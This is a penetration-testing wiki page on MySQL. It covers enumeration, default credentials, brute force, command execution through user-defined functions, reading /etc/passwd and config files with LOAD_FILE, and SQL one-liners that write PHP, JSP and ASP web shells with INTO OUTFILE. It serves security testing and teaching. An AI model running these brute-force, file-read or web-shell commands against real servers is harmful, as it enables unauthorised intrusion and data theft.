---
authors: ShutdownRepo, felixbillieres
category: infra
---

# MySQL

## Theory

MySQL is an open-source relational database management system (RDBMS) that uses the MySQL protocol for client-server communication. It typically runs on port `3306/TCP`. MySQL is widely used in web applications and can contain sensitive information such as user credentials, personal data, and application configurations.

MySQL supports various authentication methods:
* Native password authentication
* SHA-256 password authentication
* Caching SHA-2 password authentication
* Windows authentication (on Windows) - Rare, available in MySQL Enterprise Edition which can integrate with Windows AD credentials via MySQL Enterprise Authentication. Not available on all installations.

Exploiting MySQL can lead to:
* Data exfiltration
* Command execution on the database server (via User Defined Functions or file operations)
* Lateral movement within the network
* Privilege escalation

## Enumeration

### Port scanning

MySQL typically runs on port `3306/TCP`, but it can be configured to run on custom ports. MySQL uses only TCP/3306 by default. Some scanners may check UDP/3306, but no standard MySQL service listens on UDP.

```bash
# Basic port scan
nmap -p 3306 $TARGET

# Service version detection
nmap -p 3306 -sV $TARGET

# MySQL-specific scripts
nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-users,mysql-databases,mysql-variables,mysql-audit,mysql-enum $TARGET

# Scan UDP port (very rare, not standard)
nmap -sU -p 3306 $TARGET
```

### Banner grabbing

```bash
# Using nc
nc -vn $TARGET 3306

# Using nmap
nmap -p 3306 -sV $TARGET

# Using mysql client (if available)
mysql -h $TARGET -P 3306
```

> [!NOTE]
> Banner grabbing via `nc` may be unreliable because MySQL expects a client handshake. Sometimes you'll see version information (5.7.x or 8.0.x), but sometimes `nc` shows nothing or closes immediately. Use `nmap` or the MySQL client for more reliable results.

## Authentication

### Authentication enumeration

Check if MySQL allows anonymous connections or uses weak authentication.

```bash
# Check for empty password
nmap -p 3306 --script mysql-empty-password $TARGET

# Enumerate users
nmap -p 3306 --script mysql-users --script-args mysqluser=root $TARGET
```

### Default credentials

MySQL often uses default credentials, especially in development environments and on older servers:

* `root` / `<empty>`
* `root` / `root`
* `root` / `toor`
* `admin` / `admin`
* `mysql` / `mysql`

> [!NOTE]
> Since MySQL 5.7+, installation creates a random password and forces the user to set it. Default credentials like `root/root` or `root/toor` are mainly found on:
> * Old MySQL versions (pre-5.7)
> * Development environments and labs
> * Negligent administrator configurations

### Bruteforce

::: tabs

=== Hydra

```bash
hydra -l root -P /path/to/passwords.txt $TARGET mysql
```

=== Metasploit

```bash
msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS $TARGET
set USERNAME root
set PASS_FILE /path/to/passwords.txt
run
```

=== Nmap

```bash
nmap -p 3306 --script mysql-brute --script-args userdb=/path/to/users.txt,passdb=/path/to/passwords.txt $TARGET
```

=== Medusa

```bash
medusa -h $TARGET -u root -P /path/to/passwords.txt -M mysql
```

:::

## Database enumeration

Once authenticated, enumerate databases, tables, and users.

::: tabs

=== mysql client

The MySQL command-line client is the standard tool for interacting with MySQL databases.

```bash
# Connect
mysql -h $TARGET -u $USER -p

# Connect with password
mysql -h $TARGET -u $USER -p$PASSWORD

# Execute single query
mysql -h $TARGET -u $USER -p$PASSWORD -e "SELECT @@version;"
```

Once connected, useful commands:

```sql
-- Get MySQL version
SELECT @@version;

-- List databases
SHOW DATABASES;

-- Use a database
USE database_name;

-- List tables
SHOW TABLES;

-- Describe table structure
DESCRIBE table_name;
-- Or
SHOW COLUMNS FROM table_name;

-- List users
SELECT user, host FROM mysql.user;

-- Get current user
SELECT USER();
SELECT CURRENT_USER();

-- Check user privileges
SHOW GRANTS;
SHOW GRANTS FOR 'username'@'host';
```

:::

## Exploitation

### Command execution and file operations

MySQL can execute operating system commands through User Defined Functions (UDF) or by reading/writing files.

::: tabs

=== User Defined Functions (UDF)

UDF allows executing system commands through MySQL functions. This requires `FILE` privilege and the ability to write to the plugin directory (`plugin_dir` must be writable).

```sql
-- Check if UDF is available
SELECT * FROM mysql.func;

-- Create UDF (requires FILE privilege and plugin directory write access)
-- This is typically done by loading a shared library
CREATE FUNCTION sys_exec RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';

-- Execute command
SELECT sys_exec('whoami');
SELECT sys_eval('id');
```

> [!CAUTION]
> UDF execution requires specific privileges and library files. This method is complex and may not work on all MySQL installations. **On MySQL 8.0**, UDF exploitation is often blocked or complicated because:
> * `plugin_dir` is often not writable
> * Cryptographic validation has been introduced
> * 64-bit libraries are required
> 
> UDF exploitation works mainly on MySQL 5.x or poorly secured installations.

=== File operations

MySQL can read and write files if the user has `FILE` privilege.

```sql
-- Check FILE privilege
SHOW GRANTS FOR 'username'@'host';

-- Read system files
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');

-- Read configuration files
SELECT LOAD_FILE('/etc/mysql/my.cnf');
SELECT LOAD_FILE('C:\\ProgramData\\MySQL\\MySQL Server 8.0\\my.ini');

-- Read application files
SELECT LOAD_FILE('/var/www/html/config.php');

-- Write web shells (requires FILE privilege and writable web root)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' INTO OUTFILE '/var/www/html/shell.jsp';
SELECT '<% eval request("cmd") %>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\shell.asp';

-- Write data to file
SELECT * FROM users INTO OUTFILE '/tmp/users.txt';

-- Export with specific format
SELECT * FROM users INTO OUTFILE '/tmp/users.csv' FIELDS TERMINATED BY ',' ENCLOSED BY '"' LINES TERMINATED BY '\n';
```

> [!WARNING]
> File operations require `FILE` privilege and appropriate file system permissions. The `secure_file_priv` variable may restrict file operations.
> 
> **Important notes:**
> * Since MySQL 5.6/5.7, `secure_file_priv` disables `INTO OUTFILE` outside of a dedicated directory. This parameter is often enabled, which prevents web shells via `OUTFILE`.
> * `LOAD_FILE` requires MySQL to have access to the file path, the file must be readable by the MySQL service OS user, and `secure_file_priv` may restrict read operations.

:::

### Data exfiltration

Extract sensitive data from databases.

```sql
-- List all databases
SHOW DATABASES;

-- Use a database
USE database_name;

-- List tables
SHOW TABLES;

-- Extract data from a table
SELECT * FROM users;
```

## Navigation in database

### Useful SQL queries

```sql
-- Get MySQL version
SELECT @@version;
SELECT VERSION();

-- Get current user
SELECT USER();
SELECT CURRENT_USER();
SELECT SYSTEM_USER();

-- Get current database
SELECT DATABASE();

-- List all databases
SHOW DATABASES;

-- List tables in current database
SHOW TABLES;

-- List tables in specific database
SHOW TABLES FROM database_name;

-- Describe table structure
DESCRIBE table_name;
SHOW COLUMNS FROM table_name;
SHOW CREATE TABLE table_name;

-- Get table information
SELECT TABLE_SCHEMA, TABLE_NAME, TABLE_ROWS, DATA_LENGTH, INDEX_LENGTH 
FROM information_schema.TABLES 
WHERE TABLE_SCHEMA = 'database_name';

-- List columns in a table
SELECT COLUMN_NAME, DATA_TYPE, IS_NULLABLE, COLUMN_DEFAULT 
FROM information_schema.COLUMNS 
WHERE TABLE_SCHEMA = 'database_name' AND TABLE_NAME = 'table_name';

-- Count rows in a table
SELECT COUNT(*) FROM table_name;

-- Search for specific data
SELECT * FROM table_name WHERE column_name LIKE '%search_term%';

-- List all users
SELECT user, host FROM mysql.user;

-- List user privileges
SHOW GRANTS;
SHOW GRANTS FOR 'username'@'host';

-- Check user privileges (note: this query does not reflect all active privileges, especially since MySQL 8.0)
-- Reading mysql.user only shows global columns; privileges can be inherited via roles, mysql.db, mysql.tables_priv, etc.
-- Use SHOW GRANTS for a complete view of privileges
SELECT * FROM mysql.user WHERE user = 'username';

-- List stored procedures
SHOW PROCEDURE STATUS;
SELECT ROUTINE_NAME FROM information_schema.ROUTINES WHERE ROUTINE_TYPE = 'PROCEDURE';

-- List functions
SHOW FUNCTION STATUS;
SELECT ROUTINE_NAME FROM information_schema.ROUTINES WHERE ROUTINE_TYPE = 'FUNCTION';

-- List triggers
SHOW TRIGGERS;
SELECT TRIGGER_NAME FROM information_schema.TRIGGERS;

-- Get database size
SELECT 
    table_schema AS 'Database',
    ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'
FROM information_schema.tables
GROUP BY table_schema;

-- Information schema queries
-- MySQL's information_schema database contains metadata about all databases and tables

-- List all databases (via information_schema)
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;

-- List all tables (via information_schema)
SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES;

-- List all columns (via information_schema)
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE 
FROM information_schema.COLUMNS;

-- Get table statistics (via information_schema)
SELECT 
    TABLE_SCHEMA,
    TABLE_NAME,
    TABLE_ROWS,
    AVG_ROW_LENGTH,
    DATA_LENGTH,
    INDEX_LENGTH
FROM information_schema.TABLES
WHERE TABLE_SCHEMA = 'database_name';
```

## Resources

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)
